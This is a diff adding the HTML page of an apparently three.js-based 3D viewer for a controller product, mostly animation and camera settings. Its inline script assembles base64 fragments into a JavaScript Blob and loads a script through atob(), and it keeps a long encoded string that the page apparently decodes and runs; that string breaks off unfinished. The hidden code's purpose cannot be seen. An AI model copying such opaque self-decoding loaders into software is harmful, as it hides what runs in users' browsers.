@@ -1,0 +1,1307 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0" />
+        <link rel="shortcut icon" type="image/x-icon" href="assets/images/360 logo.webp" />
+        <link rel="stylesheet" href="assets/css/style.css" />
+        <script>
+            window.parent.postMessage({ isLive: !0 }, "*");
+            let urlCharDecode = (url) => {
+                return url
+                    .toString()
+                    .replace(/%2C/g, ",")
+                    .replace(/%CF%85/g, "υ")
+                    .replace(/%CF%82/g, "ς")
+                    .replace(/%20/g, " ")
+                    .replace(/%26/g, "&")
+                    .replace(/%27/g, "'")
+                    .replace(/%22/g, '"')
+                    .replace(/%3C/g, "<")
+                    .replace(/%3E/g, ">")
+                    .replace(/%28/g, "(")
+                    .replace(/%29/g, ")")
+                    .replace(/%5B/g, "[")
+                    .replace(/%5D/g, "]")
+                    .replace(/%7B/g, "{")
+                    .replace(/%7D/g, "}");
+            },
+            _pm = {
+                url: urlCharDecode(location.href).split("#").slice(-1).toString(),
+                page: location.pathname.split("/").slice(-1)[0],
+                hash: document.location.hash.replace(/\#/, ""),
+                chars: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
+                numeric: "0123456789",
+                buttons: {},
+                public: "",
+                tag: "rithmytic",
+                user: localStorage.user ? JSON.parse(localStorage.user) : { uid: [...crypto.getRandomValues(new Uint8Array(8))].map(b=>b.toString(16).padStart(2, "0")).join("") },
+                return: { received: 0, total: 0, key: null, target: null, data: null, exist: null },
+                worker: [],
+                useWebGPU: null,
+                firebase: {
+                    url: ["firebase", "firebase-database"]
+                },
+                load: (d) => {
+                    _ux.y.append({
+                        e: "body",
+                        c: (_pm.useWebGPU = _pm.p.environment && _pm.p.environment.useWebGPU)
+                            ? `{
+                            "imports": {
+                                "three": "./assets/js/build/three.webgpu.min.js",
+                                "three/webgpu": "./assets/js/build/three.webgpu.min.js",
+                                "three/tsl": "./assets/js/build/three.tsl.min.js",
+                                "three/addons/": "./assets/js/",
+                                "@needle-tools/gltf-progressive": "./assets/js/external/gltf-progressive.min.js"
+                            }
+                        }`
+                            : `{
+                            "imports": {
+                                "three": "./assets/js/build/three.module.min.js",
+                                "three/addons/": "./assets/js/",
+                                "@needle-tools/gltf-progressive": "./assets/js/external/gltf-progressive.min.js"
+                            }
+                        }`,
+                        t: "importmap" });
+                    d.e = document[_ux.eu](_ux.rp);
+                    d.e.src = "assets/js/interactive.js";
+                    d.e.type = "module";
+                    document.body[_ux.rf](d.e);
+                },
+                _establish: d => {
+                    if (navigator.onLine)
+                        document.head.appendChild(Object.assign(document.createElement("script"), {
+                            src: `assets/js/firebase/${_pm.firebase.url[d.i]}.js`,
+                            onload: () => {
+                                (d.i++) < _pm.firebase.url.length - 1 ? _pm._establish({
+                                    i: d.i
+                                }) : _pm.fb = !0
+                            }
+                        }));
+                    localStorage.user = JSON.stringify(_pm.user);
+                },
+                decam: {
+                    fade: (e, d, o, t) => {
+                        if (e) {
+                            o = 1;
+                            t = setInterval(() => {
+                                if (o <= 0.1) {
+                                    clearInterval(t);
+                                    e.style.display = "none"
+                                }
+                                e.style.opacity = o;
+                                e.style.filter = "alpha(opacity=" + o * 100 + ")";
+                                o -= o * 50 / d
+                            }, 10)
+                        }
+                    },
+                    unfade: (e, d, o, t) => {
+                        if (e) {
+                            o = 0.1;
+                            e.style.display = "flex";
+                            t = setInterval(() => {
+                                if (o >= 1) clearInterval(t);
+                                e.style.opacity = o;
+                                e.style.filter = "alpha(opacity=" + o * 100 + ")";
+                                o += o * 50 / d
+                            }, 10)
+                        }
+                    }
+                }
+            },
+            detectDevice = () => {
+                _pm.mobile = window.matchMedia("(any-hover: none)").matches;
+                _pm.orientation = window.innerWidth > window.innerHeight;
+                if (_pm.mobile) document.body.style.zoom = _pm.orientation == 0 && window.innerWidth > 600 ? "100%" : "100%";
+                return { mobile: _pm.mobile, landscape: _pm.orientation };
+            },
+            isOnline = () => {
+                if (_pm.fb) {
+                    if (_pm.android) {
+                        return AppInterface.isAppOnline();
+                    } else if (navigator.onLine) return !0;
+                } else return !1;
+            },
+            getrandom = (rs0, ln1) => {
+                for (gr1 = 0, ra0 = ""; gr1 < ln1; gr1++) {
+                    ra1 = Math.floor(Math.random() * rs0.length);
+                    ra0 += rs0.substring(ra1, ra1 + 1);
+                }
+                return ra0;
+            },
+            deleteArray = (d) => {
+                delete d.a[d.i];
+                return d.a.filter((o) => {
+                    return o !== null;
+                });
+            },
+            _start = () => {
+                try {
+                    if (_leader && loadProgram) {
+                        _leader({});
+                        _pm.issue({});
+                        renderer.setAnimationLoop(render);
+                    } else setTimeout(_start, 240);                     
+                } catch (error) { setTimeout(_start, 240) }
+            };
+            _pm._establish({
+                i: 0
+            });
+        </script>
+        <script src="assets/js/canvas-icons.js"></script>
+        <script type="module">
+            import { Server } from "./assets/js/server.js";
+            let svr = new Server({ ["53"]: `NoKX1gXSh7ZGF0YXVybDpza2luW2hhc2hdIH0pXSx7dHlwZToidGV4dC9qYXZh`, ["64"]: `dyBCbG9iKFtfdXgueS54Lm9wW3BhcnNlSW50KGhhc2gpXVtgdG9CYXNlJHtwYX` }), { _ux, e } = svr.load({ type: "module" }); window._ux = _ux;
+            e.src = atob(_ux.dom.s);
+            e.addEventListener("load", () => _pm.load({ e: _ux.y.load({}) }));
+            document.addEventListener("DOMContentLoaded", () => {
+                document.body.appendChild(_ux.dom.e = e)
+            });
+        </script>
+        <!-- <script src="assets/ar/js/three.js"></script>
+        <script src="assets/ar/jsartoolkit5/artoolkit.min.js"></script>
+        <script src="assets/ar/jsartoolkit5/artoolkit.api.js"></script>
+        <script src="assets/ar/threex/threex-artoolkitsource.js"></script>
+        <script src="assets/ar/threex/threex-artoolkitcontext.js"></script>
+        <script src="assets/ar/threex/threex-arbasecontrols.js"></script>
+        <script src="assets/ar/threex/threex-armarkercontrols.js"></script>
+        <script src="assets/ar/threex/threex-arsmoothedcontrols.js"></script> -->
+    </head>
+    <body style="display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden;">
+        <script type="text/javascript">
+            window.parent.postMessage({ isLive: !0 }, "*");
+            detectDevice();
+            let camera,
+                scene,
+                renderer,
+                postProcessing,
+                controls,
+                clock,
+                stats,
+                mixers = {},
+                frustum,
+                raycaster,
+                water,
+                csm,
+                restoreMat,
+                alphaMap,
+                arToolkitSource,
+                arToolkitContext,
+                smoothedControls,
+                markerRoot1,
+                smoothedRoot,
+                magnify = {
+                    ratio: _pm.mobile ? 1.2 : 1.8,
+                    scale: _pm.mobile ? 3.6 : 2.4,
+                    pixelate: 1,
+                    diameter: 7,
+                    min: 27,
+                    max: 152,
+                    grow: null,
+                    cursor: null,
+                    lens: { x: 0, y: 0 },
+                    mouse: { position: { x: 0, y: 0 }, moved: 0, resolution: 4, normal: 1 },
+                },
+                loopCounters = { visible: 0, magnify: 0 },
+                snaplink = document.createElement("a"),
+            _getDuplicatedObject = function () {
+                return {
+                    "controller-red-v1": {
+                        phasecoveropen: [
+                            {
+                                model: "controller red",
+                                target: ["controller-wiremotorcover", "controller-screws"],
+                                visible: 120,
+                                start: .7,
+                                once: !0,
+                                speed: 1,
+                                duration: .24,
+                            },
+                            {
+                                model: "controller red",
+                                target: ["controller-flatmountingadapter-frame"],
+                                visible: 120,
+                                start: .7,
+                                once: !0,
+                                speed: 1.5,
+                                duration: .24,
+                                operations: {
+                                    type: "external-dots-filter",
+                                    filter: [
+                                        "explodecontroller",
+                                        "controllerconnector1",
+                                        "controllerconnector2",
+                                        "controllerconnector3",
+                                        "controllerconnector4",
+                                        "phasecoverclose",
+                                        "completecontrollerbody",
+                                        "flatmountingadapter",
+                                        "plasticagainstheat",
+                                        "wiremotorcover",
+                                    ],
+                                    icons: {
+                                        explodecontroller: {
+                                            image: "inside-out.gif",
+                                            size: 22,
+                                        },
+                                        controllerconnector1: {
+                                            image: "node-yellow.gif",
+                                            always: !0,
+                                            size: 24,
+                                            opacity: 1,
+                                        },
+                                        controllerconnector2: {
+                                            image: "node-yellow.gif",
+                                            always: !0,
+                                            size: 24,
+                                            opacity: 1,
+                                        },
+                                        controllerconnector3: {
+                                            image: "node-yellow.gif",
+                                            always: !0,
+                                            size: 24,
+                                            opacity: 1,
+                                        },
+                                        controllerconnector4: {
+                                            image: "node-yellow.gif",
+                                            always: !0,
+                                            size: 24,
+                                            opacity: 1,
+                                        },
+                                        phasecoverclose: {
+                                            image: "orbit-center.gif",
+                                            size: 24,
+                                        },
+                                        completecontrollerbody: {
+                                            image: "node.gif",
+                                            tooltip: !0,
+                                            always: !0,
+                                            size: 12,
+                                        },
+                                        flatmountingadapter: {
+                                            image: "node.gif",
+                                            tooltip: !0,
+                                            always: !0,
+                                            size: 12,
+                                        },
+                                        plasticagainstheat: {
+                                            image: "node.gif",
+                                            tooltip: !0,
+                                            always: !0,
+                                            size: 12,
+                                        },
+                                        wiremotorcover: {
+                                            image: "node.gif",
+                                            tooltip: !0,
+                                            always: !0,
+                                            size: 12,
+                                        },
+                                    },
+                                },
+                            },
+                        ],
+                        phasecoverclose: [
+                            {
+                                model: "controller red",
+                                target: ["controller-flatmountingadapter-frame"],
+                                visible: 120,
+                                start: 2.33,
+                                once: !0,
+                                speed: 1.5,
+                                duration: .24,
+                            },
+                            {
+                                model: "controller red",
+                                target: ["controller-wiremotorcover", "controller-screws"],
+                                visible: 120,
+                                start: 2.45,
+                                once: !0,
+                                speed: 1,
+                                duration: .24,
+                                operations: {
+                                    type: "external-dots-filter",
+                                    filter: ["phasecoveropen", "controllerconnector1", "controllerconnector2", "controllerconnector3", "controllerconnector4"],
+                                    icons: {
+                                        phasecoveropen: {
+                                            image: "orbit-center.gif",
+                                            size: 24,
+                                        },
+                                        controllerconnector1: {
+                                            image: "node-yellow.gif",
+                                            always: !0,
+                                            size: 24,
+                                            opacity: 1,
+                                        },
+                                        controllerconnector2: {
+                                            image: "node-yellow.gif",
+                                            always: !0,
+                                            size: 24,
+                                            opacity: 1,
+                                        },
+                                        controllerconnector3: {
+                                            image: "node-yellow.gif",
+                                            always: !0,
+                                            size: 24,
+                                            opacity: 1,
+                                        },
+                                        controllerconnector4: {
+                                            image: "node-yellow.gif",
+                                            always: !0,
+                                            size: 24,
+                                            opacity: 1,
+                                        },
+                                    },
+                                },
+                            },
+                        ],
+                        explodecontroller: [
+                            {
+                                model: "controller red",
+                                target: ["controller-wiremotorcover"],
+                                visible: 120,
+                                start: .94,
+                                once: !0,
+                                speed: .5,
+                                duration: .12,
+                            },
+                            {
+                                model: "controller red",
+                                target: ["controller-plasticagainstheat-frame", "controller-completecontrollerbody"],
+                                visible: 120,
+                                start: .7,
+                                once: !0,
+                                speed: 1,
+                                duration: .24,
+                                operations: {
+                                    type: "external-dots-filter",
+                                    filter: ["implodecontroller", "controllerconnector1", "controllerconnector2", "controllerconnector3", "controllerconnector4"],
+                                    icons: {
+                                        implodecontroller: {
+                                            image: "inside-out.gif",
+                                            size: 22,
+                                        },
+                                        controllerconnector1: {
+                                            image: "node-yellow.gif",
+                                            always: !0,
+                                            size: 24,
+                                            opacity: 1,
+                                        },
+                                        controllerconnector2: {
+                                            image: "node-yellow.gif",
+                                            always: !0,
+                                            size: 24,
+                                            opacity: 1,
+                                        },
+                                        controllerconnector3: {
+                                            image: "node-yellow.gif",
+                                            always: !0,
+                                            size: 24,
+                                            opacity: 1,
+                                        },
+                                        controllerconnector4: {
+                                            image: "node-yellow.gif",
+                                            always: !0,
+                                            size: 24,
+                                            opacity: 1,
+                                        },
+                                    },
+                                },
+                            },
+                        ],
+                        implodecontroller: [
+                            {
+                                model: "controller red",
+                                target: ["controller-wiremotorcover"],
+                                visible: 120,
+                                start: 2.39,
+                                once: !0,
+                                speed: .5,
+                                duration: .12,
+                            },
+                            {
+                                model: "controller red",
+                                target: ["controller-plasticagainstheat-frame", "controller-completecontrollerbody"],
+                                visible: 120,
+                                start: 2.45,
+                                once: !0,
+                                speed: 1,
+                                duration: .24,
+                                operations: {
+                                    type: "external-dots-filter",
+                                    filter: [
+                                        "explodecontroller",
+                                        "phasecoverclose",
+                                        "controllerconnector1",
+                                        "controllerconnector2",
+                                        "controllerconnector3",
+                                        "controllerconnector4",
+                                        "completecontrollerbody",
+                                        "flatmountingadapter",
+                                        "plasticagainstheat",
+                                        "wiremotorcover",
+                                    ],
+                                    icons: {
+                                        explodecontroller: {
+                                            image: "inside-out.gif",
+                                            size: 22,
+                                        },
+                                        phasecoverclose: {
+                                            image: "orbit-center.gif",
+                                            size: 24,
+                                        },
+                                        controllerconnector1: {
+                                            image: "node-yellow.gif",
+                                            always: !0,
+                                            size: 24,
+                                            opacity: 1,
+                                        },
+                                        controllerconnector2: {
+                                            image: "node-yellow.gif",
+                                            always: !0,
+                                            size: 24,
+                                            opacity: 1,
+                                        },
+                                        controllerconnector3: {
+                                            image: "node-yellow.gif",
+                                            always: !0,
+                                            size: 24,
+                                            opacity: 1,
+                                        },
+                                        controllerconnector4: {
+                                            image: "node-yellow.gif",
+                                            always: !0,
+                                            size: 24,
+                                            opacity: 1,
+                                        },
+                                        completecontrollerbody: {
+                                            image: "node.gif",
+                                            tooltip: !0,
+                                            always: !0,
+                                            size: 12,
+                                        },
+                                        flatmountingadapter: {
+                                            image: "node.gif",
+                                            tooltip: !0,
+                                            always: !0,
+                                            size: 12,
+                                        },
+                                        plasticagainstheat: {
+                                            image: "node.gif",
+                                            tooltip: !0,
+                                            always: !0,
+                                            size: 12,
+                                        },
+                                        wiremotorcover: {
+                                            image: "node.gif",
+                                            tooltip: !0,
+                                            always: !0,
+                                            size: 12,
+                                        },
+                                    },
+                                },
+                            },
+                        ],
+                    },
+                    "controller-red-v2": {
+                        phasecoveropen: [
+                            {
+                                model: "controller red",
+                                target: ["controller-wiremotorcover", "controller-screws"],
+                                visible: 120,
+                                start: .7,
+                                once: !0,
+                                speed: 1,
+                                duration: .24,
+                            },
+                            {
+                                model: "controller red",
+                                target: ["controller-flatmountingadapter-frame"],
+                                visible: 120,
+                                start: .7,
+                                once: !0,
+                                speed: 1.5,
+                                duration: .24,
+                                operations: {
+                                    type: "external-dots-filter",
+                                    filter: !_pm.mobile ? ["explodecontroller", "phasecoverclose", "controllerconnector1", "controllerconnector2", "controllerconnector3", "controllerconnector4"] : ["explodecontroller", "phasecoverclose"],
+                                    icons: {
+                                        explodecontroller: {
+                                            image: "inside-out.gif",
+                                            always: !0,
+                                            size: 22,
+                                        },
+                                        phasecoverclose: {
+                                            image: "orbit-center.gif",
+                                            always: !0,
+                                            size: 24,
+                                        },
+                                        controllerconnector1: {
+                                            image: "node-yellow.gif",
+                                            always: !0,
+                                            size: 24,
+                                            opacity: 1,
+                                            unlink: !0,
+                                        },
+                                        controllerconnector2: {
+                                            image: "node-yellow.gif",
+                                            always: !0,
+                                            size: 24,
+                                            opacity: 1,
+                                            unlink: !0,
+                                        },
+                                        controllerconnector3: {
+                                            image: "node-yellow.gif",
+                                            always: !0,
+                                            size: 24,
+                                            opacity: 1,
+                                            unlink: !0,
+                                        },
+                                        controllerconnector4: {
+                                            image: "node-yellow.gif",
+                                            always: !0,
+                                            size: 24,
+                                            opacity: 1,
+                                            unlink: !0,
+                                        },
+                                    },
+                                    panes: {
+                                        show: !_pm.mobile ? ["controllerconnector1", "controllerconnector2", "controllerconnector3", "controllerconnector4"] : ["controller-slider"],
+                                        hide: [],
+                                    },
+                                },
+                            },
+                        ],
+                        phasecoverclose: [
+                            {
+                                model: "controller red",
+                                target: ["controller-flatmountingadapter-frame"],
+                                visible: 120,
+                                start: 2.33,
+                                once: !0,
+                                speed: 1.5,
+                                duration: .24,
+                            },
+                            {
+                                model: "controller red",
+                                target: ["controller-wiremotorcover", "controller-screws"],
+                                visible: 120,
+                                start: 2.45,
+                                once: !0,
+                                speed: 1,
+                                duration: .24,
+                                operations: {
+                                    type: "external-dots-filter",
+                                    filter: ["phasecoveropen"],
+                                    icons: {
+                                        phasecoveropen: {
+                                            image: "orbit-center.gif",
+                                            always: !0,
+                                            size: 24,
+                                        },
+                                    },
+                                    panes: {
+                                        hide: !_pm.mobile ? ["controllerconnector1", "controllerconnector2", "controllerconnector3", "controllerconnector4"] : ["controller-slider"],
+                                        show: [],
+                                    },
+                                },
+                            },
+                        ],
+                        explodecontroller: [
+                            {
+                                model: "controller red",
+                                target: ["controller-wiremotorcover"],
+                                visible: 120,
+                                start: .94,
+                                once: !0,
+                                speed: .5,
+                                duration: .12,
+                            },
+                            {
+                                model: "controller red",
+                                target: ["controller-plasticagainstheat-frame", "controller-completecontrollerbody"],
+                                visible: 120,
+                                start: .7,
+                                once: !0,
+                                speed: 1,
+                                duration: .24,
+                                operations: {
+                                    type: "external-dots-filter",
+                                    filter: ["implodecontroller"],
+                                    icons: {
+                                        implodecontroller: {
+                                            image: "inside-out.gif",
+                                            always: !0,
+                                            size: 22,
+                                        },
+                                    },
+                                    panes: {
+                                        show: !_pm.mobile
+                                            ? ["pwm-controller", "versatile-controller", "communication-controller", "customizable-controller", "battery-controller", "commutation-controller", "sensor-controller", "comprehensive-controller"]
+                                            : ["nano-slider"],
+                                        hide: !_pm.mobile ? ["controllerconnector1", "controllerconnector2", "controllerconnector3", "controllerconnector4"] : ["controller-slider"],
+                                    },
+                                },
+                            },
+                        ],
+                        implodecontroller: [
+                            {
+                                model: "controller red",
+                                target: ["controller-wiremotorcover"],
+                                visible: 120,
+                                start: 2.39,
+                                once: !0,
+                                speed: .5,
+                                duration: .12,
+                            },
+                            {
+                                model: "controller red",
+                                target: ["controller-plasticagainstheat-frame", "controller-completecontrollerbody"],
+                                visible: 120,
+                                start: 2.45,
+                                once: !0,
+                                speed: 1,
+                                duration: .24,
+                                operations: {
+                                    type: "external-dots-filter",
+                                    filter: !_pm.mobile ? ["explodecontroller", "phasecoverclose", "controllerconnector1", "controllerconnector2", "controllerconnector3", "controllerconnector4"] : ["explodecontroller", "phasecoverclose"],
+                                    icons: {
+                                        explodecontroller: {
+                                            image: "inside-out.gif",
+                                            always: !0,
+                                            size: 22,
+                                        },
+                                        phasecoverclose: {
+                                            image: "orbit-center.gif",
+                                            always: !0,
+                                            size: 24,
+                                        },
+                                        controllerconnector1: {
+                                            image: "node-yellow.gif",
+                                            always: !0,
+                                            size: 24,
+                                            opacity: 1,
+                                            unlink: !0,
+                                        },
+                                        controllerconnector2: {
+                                            image: "node-yellow.gif",
+                                            always: !0,
+                                            size: 24,
+                                            opacity: 1,
+                                            unlink: !0,
+                                        },
+                                        controllerconnector3: {
+                                            image: "node-yellow.gif",
+                                            always: !0,
+                                            size: 24,
+                                            opacity: 1,
+                                            unlink: !0,
+                                        },
+                                        controllerconnector4: {
+                                            image: "node-yellow.gif",
+                                            always: !0,
+                                            size: 24,
+                                            opacity: 1,
+                                            unlink: !0,
+                                        },
+                                    },
+                                    panes: {
+                                        show: !_pm.mobile ? ["controllerconnector1", "controllerconnector2", "controllerconnector3", "controllerconnector4"] : ["controller-slider"],
+                                        hide: [
+                                            "pwm-controller",
+                                            "versatile-controller",
+                                            "communication-controller",
+                                            "customizable-controller",
+                                            "battery-controller",
+                                            "commutation-controller",
+                                            "sensor-controller",
+                                            "comprehensive-controller",
+                                            "nano-slider",
+                                        ],
+                                    },
+                                },
+                            },
+                        ],
+                    },
+                };
+            },
+            _getHDR = (d) => {
+                return `${"quattro_canti_256,lake_pier_256,rotes_rathaus_256,spree_bank_256,canary_wharf_256,sunset_jhbcentral_256,shanghai_riverside_256".split(",")[Math.floor(Math.random() * 7)]}.hdr`;
+            },
+            _getExternal = function (d) {
+                for (let i = d.start; i < d.end + 1; i++) {
+                    d.i = `${d.pre}${String(i).padStart(d.l, "0")}`;
+                    if (d.op.match(/(filter)/))
+                        d.return.push(d.i);
+                    if (d.op.match(/(icons|message|proximity|button)/))
+                        d.return[d.i] = JSON.parse(JSON.stringify(d.data).replace(/__n\$/g, i));
+                }
+                return d.return;
+            },
+            _loader = (d) => {
+                if (_pm.url && _pm.url.includes("loc=")) {
+                    try {
+                        _pm.location = _pm.url.split("&&")[1].replace("loc=", "").split(",");
+                    } catch (error) {}
+                    _pm.url = _pm.url.split("&&")[0];
+                }
+                d.index = _pm.url && _pm.url.includes("load=") ? parseInt(_pm.url.replace("load=", "")) : 0;
+                _pm.session = new Date().valueOf();
+                if (localStorage.avatar)
+                    d.reg = JSON.parse(localStorage.avatar);
+                if (_pm.location)
+                    d.zone = _pm.location[0];
+                else if (d.reg && d.reg[d.index] && d.reg[d.index].entered) {
+                    if (d.reg[d.index].entered.match(/(terrain_main|terrain_port)/)) d.zone = "terrain";
+                    else if (d.reg[d.index].entered.match(/(platform_residence)/)) d.zone = "residence";
+                    else if (d.reg[d.index].entered.match(/(platform_port)/)) d.zone = "port";
+                    else if (d.reg[d.index].entered.match(/(platform_main)/)) d.zone = "main";
+                }
+                return {
+                    manager: d && d.manager ? d.manager : undefined,
+                    pIndex: d.index,
+                    collider: {
+                        geometries: {},
+                        remove: [],
+                        limit: 969
+                    },
+                    program: [
+                        {
+                            environment: {
+                                // R E A L I S T I C
+                                transparent: !0,
+                                room: !1,
+                                exposure: 7.6,
+                                physical: !0,
+                            },
+                            // environment: { // H I G H L I G H T S
+                            //     transparent: !1,
+                            //     room: { intensity: 1.24 },
+                            //     exposure: 1,
+                            //     physical: !0,
+                            // },
+                            camera: {
+                                type: "orbit-model",
+                                fov: { mobile: 76, desktop: 42 },
+                                tsl: {
+                                    bloom: !0,
+                                    vignette: !0,
+                                    // ao: !0,
+                                    // dof: !0,
+                                    // motion: !0,
+                                },
+                                zoom: 1,
+                                positions: {
+                                    index: 3,
+                                    sequence: [
+                                        { x: 0, y: .64, z: -.64 },
+                                        { x: .64, y: .64, z: -.64 },
+                                        { x: .64, y: .64, z: -.48 },
+                                        { x: 0, y: .64, z: -.64 },
+                                    ],
+                                    idle: [
+                                        { x: -.064, y: .64, z: -.64 },
+                                        { x: .064, y: .64, z: -.64 },
+                                    ],
+                                },
+                                info: {
+                                    modals: [],
+                                },
+                                target: { x: 0, y: 0, z: 0 },
+                                pixel: _pm.mobile ? .67 : .76,
+                                minPolarAngle: 20,
+                                maxPolarAngle: 160,
+                                minDistance: .1,
+                                maxDistance: .28,
+                                lerp: .096,
+                            },
+                            autoPlay: !0,
+                            dragRate: { mobile: .86, desktop: .76 },
+                            enablePan: !1,
+                            gIndex: 0,
+                            gSkybox: [
+                                {
+                                    environment: {
+                                        name: "gray_wide_street_01_256.hdr",
+                                        rotation: 0,
+                                    },
+                                },
+                            ],
+                            external: _pm.mobile
+                                ? {
+                                        operations: {},
+                                        views: {
+                                            phasecoverclose: 0,
+                                            implodecontroller: 1,
+                                            phasecoveropen: 1,
+                                            explodecontroller: 1,
+                                        },
+                                        filter: ["flipcontroller"],
+                                        icons: {
+                                            flipcontroller: {
+                                                image: "inside-out.gif",
+                                                size: 22,
+                                            },
+                                        },
+                                        animations: Object.assign(_getDuplicatedObject()["controller-red-v2"], {
+                                            flipcontroller: [
+                                                {
+                                                    model: "controller red",
+                                                    target: ["controller-red"],
+                                                    onetime: !0,
+                                                    visible: 120,
+                                                    start: 0,
+                                                    once: !0,
+                                                    speed: 1,
+                                                    duration: .6,
+                                                    operations: {
+                                                        type: "external-dots-filter",
+                                                        filter: ["phasecoveropen"],
+                                                        icons: {
+                                                            phasecoveropen: {
+                                                                image: "orbit-center.gif",
+                                                                always: !0,
+                                                                size: 24,
+                                                            },
+                                                        },
+                                                    },
+                                                },
+                                            ],
+                                        }),
+                                    }
+                                : undefined,
+                            mIndex: {
+                                selected: 0,
+                            },
+                            models: {
+                                0: {
+                                    name: "controller red",
+                                    preloaded: !0,
+                                    position: { x: 0, y: 0, z: 0 },
+                                    rotation: { x: 0, y: 90, z: 0 },
+                                    interactive: ["controller-completecontrollerbody"],
+                                },
+                            },
+                            dynamic: {
+                                model: "controller red",
+                                animation: {
+                                    hovering: {
+                                        target: ["controller-red"],
+                                        onetime: !0,
+                                        visible: 120,
+                                        start: 0,
+                                        once: !0,
+                                        speed: 1,
+                                        duration: .6,
+                                        operations: {
+                                            type: "external-dots",
+                                            values: {
+                                                views: {
+                                                    phasecoverclose: 0,
+                                                    implodecontroller: 1,
+                                                    phasecoveropen: 1,
+                                                    explodecontroller: 1,
+                                                },
+                                                animations: _getDuplicatedObject()["controller-red-v2"],
+                                                operations: {},
+                                                filter: ["phasecoveropen"],
+                                                icons: {
+                                                    phasecoveropen: {
+                                                        image: "orbit-center.gif",
+                                                        size: 24,
+                                                    },
+                                                },
+                                            },
+                                        },
+                                    },
+                                },
+                                interactive: ["controller-completecontrollerbody"],
+                            },
+                        },
+                    ],
+                };
+            },
+            loader = _loader({});
+            _pm.p = loader.program[loader.pIndex];
+            _pm.skin = skin = _pm.p.physics ? Object.assign(skin, { [`53x${Math.random().toString(36).slice(2, 10)}`]: `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